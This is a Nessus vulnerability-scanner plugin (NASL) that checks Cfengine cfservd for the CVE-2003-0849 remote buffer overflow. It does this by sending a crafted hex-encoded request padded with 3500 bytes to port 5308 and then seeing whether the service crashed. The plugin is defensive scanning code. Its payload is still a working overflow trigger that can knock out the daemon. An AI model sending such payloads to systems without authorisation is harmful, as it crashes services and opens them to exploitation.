#
# (C) Tenable Network Security, Inc.
#

# script based on exploit code by
# kokaninATdtors.net

include("compat.inc");

if (description)
{
 script_id(11893);
 script_version("$Revision: 1.20 $");
 script_cvs_date("$Date: 2017/05/16 19:35:39 $");

 script_cve_id("CVE-2003-0849");
 script_bugtraq_id(8699);
 script_osvdb_id(2611);
 script_xref(name:"Secunia", value:"9855");

 script_name(english:"Cfengine cfservd ReceiveTransaction Function Remote Overflow (intrusive check)");
 script_summary(english:"Checks for the Cfserver remote buffer overflow");

 script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a remote buffer overflow vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote Cfserver seems to be vulnerable to a remote buffer overflow
bug. Such a bug might be exploited by an attacker to execute arbitrary
code on this host, with the privileges cfservd is running with.");
 script_set_attribute(attribute:"see_also", value:"https://packetstormsecurity.com/files/31714/cfengine.txt.html");
 script_set_attribute(attribute:"solution", value:"Upgrade to version 2.0.8/2.0.8p1 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/09/25");
 script_set_attribute(attribute:"patch_publication_date", value:"2003/09/25");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/10/16");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("find_service1.nasl");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 5308;
if (!get_port_state(port)) exit(0);



req = hex2raw(s: tolower("32647564656475646564756465647564656475646509322F6173646661736466617464666173646661736466433A5C096C6F63616C686F73742E6C6F63616C646F6D61696E2E636F6D093730092D0D0A2E0D0A"));
req += crap(3500);


soc = open_sock_tcp(port);
if (!soc) exit(0);
send (socket:soc, data:req);
close(soc);
sleep(1);
soc = open_sock_tcp(port);
if (!soc) security_hole(port);
exit(0);

